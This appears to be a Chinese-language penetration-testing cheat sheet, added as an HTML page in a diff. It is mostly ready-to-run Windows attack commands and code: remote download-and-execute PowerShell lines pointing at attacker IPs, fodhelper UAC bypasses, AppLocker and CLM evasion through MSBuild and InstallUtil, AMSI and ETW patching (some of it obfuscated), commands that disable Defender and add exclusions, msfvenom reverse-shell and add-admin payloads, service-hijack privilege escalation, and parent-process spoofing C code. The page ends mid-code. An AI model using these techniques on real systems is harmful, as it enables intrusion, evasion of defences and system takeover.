@@ -1,0 +1,3002 @@
+<h1 id="Code-Execution"><a href="#Code-Execution" class="headerlink" title="Code Execution"></a>Code Execution</h1><h4 id="LOLBAS："><a href="#LOLBAS：" class="headerlink" title="LOLBAS："></a>LOLBAS：</h4><pre><code class="bash">https://lolbas-project.github.io/
+</code></pre>
+<h4 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h4><pre><code class="bash">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.45.154:80/shell.ps1&#39;))&quot;
+Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;ht&quot;+&quot;tp://10.10.16.7/\CVE-2021-1675.ps1&quot;)
+</code></pre>
+<pre><code class="bash">powershell.exe IEX ((New-Object Net.Webclient).Downloadstring(&#39;http://192.168.45.191/amsi.txt&#39;));IEX ((New-Object Net.Webclient).Downloadstring(&#39;http://192.168.45.191/Invoke-PowerShellTcp.ps1&#39;));
+</code></pre>
+<h1 id="BypassAV"><a href="#BypassAV" class="headerlink" title="BypassAV"></a>BypassAV</h1><h4 id="BypassUAC："><a href="#BypassUAC：" class="headerlink" title="BypassUAC："></a>BypassUAC：</h4><pre><code class="bash">一些软件会有一个打开，例如msconfig。azman.msc。
+</code></pre>
+<p>调用注册表利用fodhelper启动cmd:</p>
+<pre><code class="bat">REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d &quot;cmd.exe&quot; /f
+fodhelper.exe
+</code></pre>
+<p>ProgIDs powershell绕过:</p>
+<pre><code class="powershell">[String]$program = &quot;cmd /c start C:\Windows\System32\cmd.exe&quot;
+New-Item &quot;HKCU:\Software\Classes\.pwn\Shell\Open\command&quot; -Force
+Set-ItemProperty &quot;HKCU:\Software\Classes\.pwn\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value $program -Force
+New-Item -Path &quot;HKCU:\Software\Classes\ms-settings\CurVer&quot; -Force
+Set-ItemProperty  &quot;HKCU:\Software\Classes\ms-settings\CurVer&quot; -Name &quot;(default)&quot; -value &quot;.pwn&quot; -Force
+Start-Process &quot;C:\Windows\System32\fodhelper.exe&quot; -WindowStyle Hidden
+Start-Sleep 3
+Remove-Item &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Force
+Remove-Item &quot;HKCU:\Software\Classes\.pwn\&quot; -Recurse -Force
+</code></pre>
+<pre><code>New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value &quot;powershell.exe (New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.119.120/run.txt&#39;) | IEX&quot; -Force
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+C:\Windows\System32\fodhelper.exe
+</code></pre>
+<h4 id="AppLocker"><a href="#AppLocker" class="headerlink" title="AppLocker:"></a>AppLocker:</h4><pre><code class="powershell">#获取AppLocker信息
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+$a = Get-ApplockerPolicy -effective
+$a.rulecollections
+</code></pre>
+<p>PATH:</p>
+<pre><code>c:\windows\tasks
+c:\windows\system32\spool\drivers\color
+c:\users\public
+</code></pre>
+<p>递归检测目录权限RWX自动检测脚本：</p>
+<pre><code class="powershell">$group = &quot;*Users*&quot;
+$root_folder = &quot;C:\windows&quot;
+write-output &quot;[*] Processing folders recursively in $root_folder&quot;
+foreach($_ in (Get-ChildItem $root_folder -recurse -ErrorAction SilentlyContinue)){
+    if($_.PSIsContainer)
+    {
+        try{
+            $res = Get-acl $_.FullName 
+        } catch{
+            continue
+        }
+        foreach ($a in $res.access){
+            if ($a.IdentityReference -like $group){
+                if ( ($a.FileSystemRights -like &quot;*Write*&quot; -or $a.FileSystemRights -like &quot;*CreateFiles*&quot; ) -and $a.FileSystemRights -like &quot;*ReadAndExecute*&quot; ){
+                    write-host &quot;[+] &quot; $_.FullName -foregroundcolor &quot;green&quot;
+                }
+                
+            }
+        }
+    }
+}
+</code></pre>
+<p>Bypass：</p>
+<pre><code>dir \Windows\Microsoft.NET\* /s/b | findstr InstallUtil.exe$
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U .\i.exe
+</code></pre>
+<h4 id="CLM："><a href="#CLM：" class="headerlink" title="CLM："></a>CLM：</h4><p>查询：</p>
+<pre><code>$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<p>InstallUtilRunSpace</p>
+<pre><code>iwr -uri http://192.168.45.207/InstallUtilRunSpace.exe -outfile InstallUtilRunSpace.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U .\InstallUtilRunSpace.exe
+</code></pre>
+<p>MSBUILD：</p>
+<pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe pshell.xml
+</code></pre>
+<p>pshell.xml</p>
+<pre><code>&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;
+  &lt;!-- This inline task executes c# code. --&gt;
+  &lt;!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe pshell.xml --&gt;
+   &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;
+  &lt;!-- License: BSD 3-Clause --&gt;
+  &lt;Target Name=&quot;Hello&quot;&gt;
+   &lt;FragmentExample /&gt;
+   &lt;ClassExample /&gt;
+  &lt;/Target&gt;
+  &lt;UsingTask
+    TaskName=&quot;FragmentExample&quot;
+    TaskFactory=&quot;CodeTaskFactory&quot;
+    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;
+    &lt;ParameterGroup/&gt;
+    &lt;Task&gt;
+      &lt;Using Namespace=&quot;System&quot; /&gt;
+      &lt;Using Namespace=&quot;System.IO&quot; /&gt;
+      &lt;Code Type=&quot;Fragment&quot; Language=&quot;cs&quot;&gt;
+        &lt;![CDATA[
+                Console.WriteLine(&quot;Hello From Fragment&quot;);
+        ]]&gt;
+      &lt;/Code&gt;
+    &lt;/Task&gt;
+    &lt;/UsingTask&gt;
+    &lt;UsingTask
+    TaskName=&quot;ClassExample&quot;
+    TaskFactory=&quot;CodeTaskFactory&quot;
+    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;
+    &lt;Task&gt;
+      &lt;Reference Include=&quot;System.Management.Automation&quot; /&gt;
+      &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;
+        &lt;![CDATA[
+        
+            using System;
+            using System.IO;
+            using System.Diagnostics;
+            using System.Reflection;
+            using System.Runtime.InteropServices;
+
+            //Add For PowerShell Invocation
+            using System.Collections.ObjectModel;
+            using System.Management.Automation;
+            using System.Management.Automation.Runspaces;
+            using System.Text;
+
+
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+                            
+            public class ClassExample :  Task, ITask
+            {
+                public override bool Execute()
+                {
+                    
+                    while(true)
+                    {
+                        
+                        Console.Write(&quot;PS &gt;&quot;);
+                        string x = Console.ReadLine();
+                        try
+                        {
+                            Console.WriteLine(RunPSCommand(x));
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine(e.Message);
+                        }
+                    }
+                    
+                                return true;
+                }
+                
+                //Based on Jared Atkinson&#39;s And Justin Warner&#39;s Work
+                public static string RunPSCommand(string cmd)
+                {
+                    //Init stuff
+                    Runspace runspace = RunspaceFactory.CreateRunspace();
+                    runspace.Open();
+                    RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+                    Pipeline pipeline = runspace.CreatePipeline();
+
+                    //Add commands
+                    pipeline.Commands.AddScript(cmd);
+
+                    //Prep PS for string output and invoke
+                    pipeline.Commands.Add(&quot;Out-String&quot;);
+                    Collection&lt;PSObject&gt; results = pipeline.Invoke();
+                    runspace.Close();
+
+                    //Convert records to strings
+                    StringBuilder stringBuilder = new StringBuilder();
+                    foreach (PSObject obj in results)
+                    {
+                        stringBuilder.Append(obj);
+                    }
+                    return stringBuilder.ToString().Trim();
+                 }
+                 
+                 public static void RunPSFile(string script)
+                {
+                    PowerShell ps = PowerShell.Create();
+                    ps.AddScript(script).Invoke();
+                }
+                
+                
+            }
+            
+            
+ 
+            
+        ]]&gt;
+      &lt;/Code&gt;
+    &lt;/Task&gt;
+  &lt;/UsingTask&gt;
+&lt;/Project&gt;
+</code></pre>
+<h4 id="Powershell受限："><a href="#Powershell受限：" class="headerlink" title="Powershell受限："></a>Powershell受限：</h4><p>查看Powershell语言模式：</p>
+<pre><code class="powershell">$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<p>回退版本绕过：</p>
+<pre><code class="powershell">Invoke-WebRequest http://10.10.16.7/shell.ps1 -outfile shell.ps1
+powershell -version 2 -nop -nop -noexit -exec bypass -c &#39;.\shell.ps1&#39;
+</code></pre>
+<h4 id="Powershell执行策略："><a href="#Powershell执行策略：" class="headerlink" title="Powershell执行策略："></a>Powershell执行策略：</h4><pre><code class="powershell">#查看执行策略：
+Get-ExecutionPolicy
+#查看执行策略设置级别:
+Get-ExecutionPolicy -List | Format-Table -AutoSize
+</code></pre>
+<p>从文本中读取powershell指令并执行:</p>
+<pre><code class="powershell">Get-Content .runme.ps1 | PowerShell.exe -noprofile -
+TYPE .runme.ps1 | PowerShell.exe -noprofile -
+</code></pre>
+<p>远程下载:</p>
+<pre><code class="powershell">powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#39;http://bit.ly/1kEgbuH&#39;)&quot;
+</code></pre>
+<p>使用命令开关:</p>
+<pre><code class="powershell">Powershell -command &quot;Write-Host &#39;My voice is my passport, verify me.&#39;&quot;
+Powershell -c &quot;Write-Host &#39;My voice is my passport, verify me.&#39;
+</code></pre>
+<p>使用变量：</p>
+<pre><code class="powershell">$command = &quot;Write-Host &#39;My voice is my passport, verify me.&#39;&quot; 
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
+$encodedCommand = [Convert]::ToBase64String($bytes) 
+powershell.exe -EncodedCommand $encodedCommand
+</code></pre>
+<p>使用invoke-command</p>
+<pre><code class="powershell">invoke-command -scriptblock {Write-Host &quot;My voice is my passport, verify me.&quot;}
+</code></pre>
+<p>使用Invoke-Expression</p>
+<pre><code class="powershell">Get-Content .runme.ps1 | Invoke-Expression
+</code></pre>
+<p>当前用户有bypass权限:</p>
+<pre><code class="bat">PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
+powershell -ex bypass -File thm.ps1
+</code></pre>
+<p>当前用户有Unrestricted权限:</p>
+<pre><code class="bat">PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
+</code></pre>
+<p>Use the “Remote-Signed” Execution Policy Flag:</p>
+<pre><code class="bat">PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
+</code></pre>
+<p>通过更换AuthorizationManager禁用执行策略</p>
+<pre><code class="powershell">function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield(&quot;_context&quot;,&quot;nonpublic,instance&quot;).getvalue( $executioncontext)).gettype().getfield(&quot;_authorizationManager&quot;,&quot;nonpublic,instance&quot;).setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager &quot;Microsoft.PowerShell&quot;))}  Disable-ExecutionPolicy  .runme.ps1
+</code></pre>
+<p>通过命令设置执行策略：</p>
+<pre><code class="powershell">Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+</code></pre>
+<p>设置进程范围执行策略：</p>
+<pre><code class="powershell">Set-ExecutionPolicy Bypass -Scope Process
+Set-ExecutionPolicy RemoteSigned
+</code></pre>
+<h4 id="AMSI"><a href="#AMSI" class="headerlink" title="AMSI:"></a>AMSI:</h4><pre><code class="powershell">#回退版本：
+PowerShell -Version 2
+
+[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true)
+</code></pre>
+<pre><code class="powershell">S`eT-It`em ( &#39;V&#39;+&#39;aR&#39; +  &#39;IA&#39; + (&#39;blE:1&#39;+&#39;q2&#39;)  + (&#39;uZ&#39;+&#39;x&#39;)  ) ( [TYpE](  &quot;{1}{0}&quot;-F&#39;F&#39;,&#39;rE&#39;  ) )  ;    (    Get-varI`A`BLE  ( (&#39;1Q&#39;+&#39;2U&#39;)  +&#39;zX&#39;  )  -VaL  ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f(&#39;Uti&#39;+&#39;l&#39;),&#39;A&#39;,(&#39;Am&#39;+&#39;si&#39;),(&#39;.Man&#39;+&#39;age&#39;+&#39;men&#39;+&#39;t.&#39;),(&#39;u&#39;+&#39;to&#39;+&#39;mation.&#39;),&#39;s&#39;,(&#39;Syst&#39;+&#39;em&#39;)  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f(&#39;a&#39;+&#39;msi&#39;),&#39;d&#39;,(&#39;I&#39;+&#39;nitF&#39;+&#39;aile&#39;)  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f (&#39;S&#39;+&#39;tat&#39;),&#39;i&#39;,(&#39;Non&#39;+&#39;Publ&#39;+&#39;i&#39;),&#39;c&#39;,&#39;c,&#39;  )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
+</code></pre>
+<pre><code class="powershell">$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like &quot;*iUtils&quot;) {$c=$b}};$d=$c.GetFields(&#39;NonPublic,Static&#39;);Foreach($e in $d) {if ($e.Name -like &quot;*Context&quot;) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+</code></pre>
+<p>vsersion2</p>
+<pre><code>[Ref].Assembly.GetType(&#39;System.Management.Automation.&#39;+$(&quot;41 6D 73 69 55 74 69 6C 73&quot;.Split(&quot; &quot;)|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($(&quot;61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64&quot;.Split(&quot; &quot;)|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),&#39;NonPublic,Static&#39;).SetValue($null,$true)
+</code></pre>
+<h4 id="ETW绕过："><a href="#ETW绕过：" class="headerlink" title="ETW绕过："></a>ETW绕过：</h4><pre><code class="c">#include &lt;Windows.h&gt;
+#include &lt;Tlhelp32.h&gt;
+int main() {
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb = sizeof(si);
+
+    // 1. 建立一个 Powershell Process，并取得 Process Handle
+    CreateProcessA(NULL, (LPSTR)&quot;powershell -noexit&quot;, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);
+
+    // 2. 从 ntdll.dll 中取得 EtwEventWrite 的地址
+    HMODULE hNtdll = GetModuleHandleA(&quot;ntdll.dll&quot;);
+    LPVOID pEtwEventWrite = GetProcAddress(hNtdll, &quot;EtwEventWrite&quot;);
+
+    // 3. 把 EtwEventWrite 的地址的权限改成可读、可写、可执行(rwx)
+    DWORD oldProtect;
+    VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &amp;oldProtect);
+
+    // 4. 将 EtwEventWrite 的第一个 byte 改成 0xc3，也就是ret返回指令
+    char patch = 0xc3;
+    WriteProcessMemory(pi.hProcess, (LPVOID)pEtwEventWrite, &amp;patch, sizeof(char), NULL);
+
+    // 5. 把 EtwEventWrite 的权限改回，并且继续执行 Process
+    VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, oldProtect, NULL);
+    ResumeThread(pi.hThread);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    return 0;
+}
+</code></pre>
+<pre><code class="powershell">$logProvider = [Ref].Assembly.GetType(&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;)
+$etwProvider = $logProvider.GetField(&#39;etwProvider&#39;,&#39;NonPublic,Static&#39;).GetValue($null)
+$etwProvider = $logProvider.GetField(&#39;etwProvider&#39;,&#39;NonPublic,Static&#39;).GetValue($null)
+</code></pre>
+<h4 id="命令混淆："><a href="#命令混淆：" class="headerlink" title="命令混淆："></a>命令混淆：</h4><p>环境变量：</p>
+<pre><code class="bat">C:\Users\World&#39;sEnd\Desktop&gt;echo %SystemRoot%
+C:\Windows
+
+C:\Users\World&#39;sEnd\Desktop&gt;echo %tmp%
+C:\Users\WORLD&#39;~1\AppData\Local\Temp
+
+C:\Users\World&#39;sEnd\Desktop&gt;&quot;%SystemRoot:~3,1%h%SystemRoot:~7,1%a%tmp:~-2,1%i&quot;
+worldisend\world&#39;send
+</code></pre>
+<p>For Loop Value Extraction:</p>
+<pre><code class="bat">cmd /k &quot;for /f &quot;Delims=s\ Tokens=4&quot; %a in (&#39;set | findstr PSM&#39;) do %a&quot;
+</code></pre>
+<p>该命令<strong>Delims</strong>的意思是以<strong>s和\</strong>作为分节符，大小写敏感，将以上字符分割成：<br>PSModulePath&#x3D;C: U er World’ End Document Window PowerShell</p>
+<pre><code class="bat">C:\Users\World&#39;sEnd\Desktop&gt;set | findstr PSM
+PSModulePath=C:\Users\World&#39;sEnd\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+
+C:\Users\World&#39;sEnd\Desktop&gt;for /f &quot;Delims=s\ Tokens=8&quot; %a in (&#39;set ^| findstr PSM&#39;) do %a
+</code></pre>
+<pre><code class="bat">C:\Users\World&#39;sEnd\Desktop&gt;for /f &quot;Delims=s\ Tokens=7&quot; %a in (&#39;set ^| findstr PSM&#39;) do %a
+
+C:\Users\World&#39;sEnd\Desktop&gt;PowerShell
+Windows PowerShell
+版权所有（C） Microsoft Corporation。保留所有权利。
+
+安装最新的 PowerShell，了解新功能和改进！https://aka.ms/PSWindows
+</code></pre>
+<p>双引号：</p>
+<pre><code class="BAT">cmd /c p&quot;owe&quot;&quot;&quot;rshe&quot;&quot;ll
+</code></pre>
+<p>括号:</p>
+<pre><code class="BAT">cmd /c (  (powershell))
+</code></pre>
+<p>逗号与分号：</p>
+<pre><code class="BAT">cmd;;,,/c,;netstat
+</code></pre>
+<p>自动混淆工具：</p>
+<pre><code class="BAT">https://github.com/danielbohannon/Invoke-DOSfuscation
+</code></pre>
+<h1 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h1><h3 id="linux："><a href="#linux：" class="headerlink" title="linux："></a>linux：</h3><h4 id="查找SUID"><a href="#查找SUID" class="headerlink" title="查找SUID"></a>查找SUID</h4><pre><code class="bash">#linux
+https://gtfobins.github.io/
+find / -perm -u=s -type f 2&gt;/dev/null
+find / -perm -4000 -type f 2&gt;/dev/null
+find -type f -writable -ls
+find / -exec getcap {} \; 2&gt;/dev/null
+</code></pre>
+<h3 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h3><pre><code class="bash">#windows
+#计划任务：
+schtasks /query /fo LIST /v
+#查找看计划任务配置：
+schtasks /query /fo LIST 2&gt;nul
+#powershell:
+Get-ScheduledTask
+
+#可利用Powershell进行筛选 删除包含/Microsoft/Windows/路径的所有任务：
+Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike &quot;\Microsoft\Windows\*&quot;) -And ($_.Principal.UserId -notlike &quot;*$env:UserName*&quot;)} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name=&quot;User&quot;;Expression={$_.Principal.userID}}
+
+#分析计划任务执行间隔:
+$task= Get-ScheduledTask -TaskName &lt;TaskName&gt;
+ForEach ($triger in $task.Triggers) { echo $triger.Repetition.Interval}
+#任务的动作:
+$task= Get-ScheduledTask -TaskName &lt;TaskName&gt;
+ForEach ($action in $task.Actions) { Select $action.Execute}
+#查找计划任务行为所在目录，低权限用户是否具有可写权限 :
+accesschk64.exe -accepteula -wv lowuser C:\ScheduledTasks\name\backdoor.exe
+#或者手动替换，或者命令行直接远程下载替换:
+certutil -urlcache -split -f &quot;http://xx.xx.xx.xx/backdoor.exe&quot; C:\ScheduledTasks\TaskName\backdoor.exe
+#在Windows2000、Windows 2003、Windows XP 这三类系统中，可以使用at命令将权限提升至system权限:
+at &lt;time&gt; /interactive cmd  
+#创建计划任务,在使用schtasks命令的时候会在系统留下日志文件:
+schtasks /create /s 10.10.10.80 /tn test /sc onstart/tr c:\artifact.exe /ru system /f
+</code></pre>
+<h4 id="PowerUp-ps1："><a href="#PowerUp-ps1：" class="headerlink" title="PowerUp.ps1："></a>PowerUp.ps1：</h4><pre><code class="powershell">upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+invoke-allchecks
+</code></pre>
+<h4 id="windows-MSI："><a href="#windows-MSI：" class="headerlink" title="windows MSI："></a>windows MSI：</h4><pre><code class="powershell">#windows注册表键AlwaysInstallElevated：查询是否开启：
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysinstallElevated
+#如果没开启可以尝试添加(一般需要管理员权限):
+reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysinstallElevated /t REG_DWORD /d 1
+#关闭配置将1改为0：
+reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysinstallElevated /t REG_DWORD /d 0
+
+#如果有开启权限可以Metasploit生成msi程序用于安装：
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.11.75.230 lport=4444 -f msi -o shell.msi
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
+
+#msiexec后台静默安装：
+msiexec /quiet /qn /i C:\Users\thm-unpriv\shell.msi
+</code></pre>
+<h4 id="包含空格的服务："><a href="#包含空格的服务：" class="headerlink" title="包含空格的服务："></a>包含空格的服务：</h4><pre><code class="bat">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;
+</code></pre>
+<p>查看服务信息：</p>
+<pre><code class="bat">查询服务：
+tasklist /SVC
+net start
+#powershell查看服务。
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like &#39;Running&#39;}
+
+wmic service where caption=&quot;服务名称&quot; get name, caption, state, startmode
+sc qc server_name 
+sc config server_name  binpath = &quot;.exe&quot;
+sc stop server_name   
+sc start server_name 
+
+#创建服务
+sc Create server_name binPath= &quot;cmd /K start&quot; type= own type= interact
+sc start server_name 
+
+
+C:\Users\nina&gt;sc config snmptrap obj= &quot;NT AUTHORITY\SYSTEM&quot; password= &quot;&quot;
+C:\Users\nina&gt;sc config SNMPTRAP binpath=&quot;cmd /c net localgroup administrators FINAL\nina /add&quot;
+C:\Users\nina&gt;sc config snmptrap start= auto
+C:\Users\nina&gt;sc start snmptrap
+C:\Users\nina&gt;net localgroup administrators
+</code></pre>
+<h4 id="检测目录权限："><a href="#检测目录权限：" class="headerlink" title="检测目录权限："></a>检测目录权限：</h4><pre><code class="powershell">“M”表示修改，“F”代表完全控制，“CI”代表从属容器将继承访问控制项，“OI”代表从属文件将继承访问控制项。
+icacls “C:\Program Files”
+icacls “C:\Program Files\Common Files”
+
+#accesschk64.exe(微软官方工具)查找：
+#查看指定文件夹目录权限配置情况:
+accesschk64.exe -dqv &quot;C:\Program Files (x86)&quot; -accepteula
+#查看用户对某个驱动器下有问题的文件夹
+accesschk64.exe -uwdqs &lt;用户名&gt; c:\
+#查看某个驱动器下所有「权限配置」有问题的文件
+accesschk64.exe -uwdqs &lt;用户名&gt; c:\*.*
+#检查服务 如果是.SERVICE_ALL_ACCESS的意思是对“Vulnerable Service”的属性拥有完全控制权：
+accesschk.exe -uwcqv &quot;&lt;用户名&gt;&quot; * /accepteula
+</code></pre>
+<h4 id="文件缺失："><a href="#文件缺失：" class="headerlink" title="文件缺失："></a>文件缺失：</h4><pre><code class="powershell">#系统服务文件缺失：可利用微软发布的工具查找缺失文件的服务
+autorunsc -a s | more
+#计划任务文件缺失：找出计划任务中缺失的文件，生成对应的载荷进行替换。
+autorunsc64.exe -a t|more
+</code></pre>
+<h4 id="环境变量："><a href="#环境变量：" class="headerlink" title="环境变量："></a>环境变量：</h4><pre><code class="powershell">#windows
+#查询环境变量：
+reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&quot;
+#检测path目录当前用户是否能够写入，如若可写，可将恶意文件移动到对应目录，通过环境变量调用。
+icacls path
+</code></pre>
+<h4 id="过时驱动："><a href="#过时驱动：" class="headerlink" title="过时驱动："></a>过时驱动：</h4><pre><code class="powershell">#windows
+列举安装的驱动程序
+driverquery /v
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
+
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like &quot;*VMware*&quot;}
+</code></pre>
+<h4 id="子系统："><a href="#子系统：" class="headerlink" title="子系统："></a>子系统：</h4><pre><code class="bat">C:\Windows\System32\bash.exe
+C:\Windows\System32\wsl.exe
+
+wsl whoami
+./ubuntun1604.exe config --default-user root
+wsl whoami
+wsl python -c &#39;BIND_OR_REVERSE_SHELL_PYTHON_CODE&#39;
+</code></pre>
+<h1 id="AntiVirus"><a href="#AntiVirus" class="headerlink" title="AntiVirus"></a>AntiVirus</h1><h4 id="MSF-payload："><a href="#MSF-payload：" class="headerlink" title="MSF payload："></a>MSF payload：</h4><pre><code>//vba
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120
+LPORT=443 EXITFUNC=thread -f vbapplication
+//c#
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.203.214
+lport=9000 -f csharp
+//vba
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120
+LPORT=443 EXITFUNC=thread -f ps1
+</code></pre>
+<h4 id="杀软查询："><a href="#杀软查询：" class="headerlink" title="杀软查询："></a>杀软查询：</h4><pre><code>$securityCenter = Get-WmiObject -Namespace &quot;root\SecurityCenter2&quot; -Class AntiVirusProduct; if ($securityCenter) { $securityCenter | Select-Object -ExpandProperty displayName } else { Write-Host &quot;No antivirus products found.&quot; }
+
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPReference -DisableIOAVProtection $true
+</code></pre>
+<h4 id="Defener加白："><a href="#Defener加白：" class="headerlink" title="Defener加白："></a>Defener加白：</h4><pre><code class="bat">powershell.exe -exec bypass -Command &quot;&amp; {Add-MpPreference -ExclusionPa
+th &#39;C:\&#39; }&quot;
+
+Add-MpPreference -ExclusionPath &quot;C:\users\public&quot;
+
+WMIC /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=&quot;C:\&quot;
+
+#清空特征库
+&quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot; -RemoveDefinitions -All -DisableOAVProtection $true
+</code></pre>
+<h4 id="进程Spoofing："><a href="#进程Spoofing：" class="headerlink" title="进程Spoofing："></a>进程Spoofing：</h4><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+
+
+DWORD FindExplorerPID() {
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 process = { 0 };
+    process.dwSize = sizeof(process);
+
+    if (Process32First(snapshot, &amp;process)) {
+        do {
+            if (!wcscmp(process.szExeFile, L&quot;Code.exe&quot;))
+                break;
+        } while (Process32Next(snapshot, &amp;process));
+    }
+
+    CloseHandle(snapshot);
+    return process.th32ProcessID;
+}
+
+int main() {
+
+    unsigned char shellcode[] = &quot;&quot;;
+
+    STARTUPINFOEXA siex;
+    ZeroMemory(&amp;siex, sizeof(STARTUPINFOEXA));
+    PROCESS_INFORMATION piex;
+    SIZE_T sizeT;
+    siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+
+    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, FindExplorerPID());
+
+    InitializeProcThreadAttributeList(NULL, 1, 0, &amp;sizeT);
+    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
+    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &amp;sizeT);
+    UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, sizeof(HANDLE), NULL, NULL);
+
+
+    CreateProcessA(&quot;E:\\Software\\QQ\\Bin\\QQ.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&amp;siex, &amp;piex);
+
